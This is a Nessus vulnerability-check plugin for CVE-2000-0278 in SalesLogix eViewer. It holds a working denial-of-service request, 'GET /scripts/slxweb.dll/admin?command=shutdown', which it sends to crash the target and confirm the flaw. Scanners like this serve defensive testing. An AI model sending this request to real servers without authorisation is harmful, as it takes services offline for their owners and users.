#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10361);
 script_version ("$Revision: 1.28 $");
 script_cve_id("CVE-2000-0278");
 script_bugtraq_id(1089);
 script_xref(name:"OSVDB", value:"1273");
 
 script_name(english:"SalesLogix eViewer slxweb.dll Request Remote DoS");
 script_summary(english:"Crashes Eviewer");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application running on the remote host has a denial of service\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It was possible to crash the remote server by requesting :\n\n",
     "  GET /scripts/slxweb.dll/admin?command=shutdown\n\n",
     "A remote attacker could use this flaw to crash this host,\n",
     "preventing your network from working properly."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-04/0006.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Remove this CGI from the web server."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
 );
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");

 script_dependencies("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

 if ( http_is_dead(port:port) ) exit(0);
 start_denial();
 r = http_send_recv3(method: "GET", item:"/scripts/slxweb.dll/admin?command=shutdown",
 	        port:port);
 alive = end_denial();
if(!alive && http_is_dead(port:port))
{
	security_hole(port);
	set_kb_item(name:"Host/dead", value:TRUE);
}

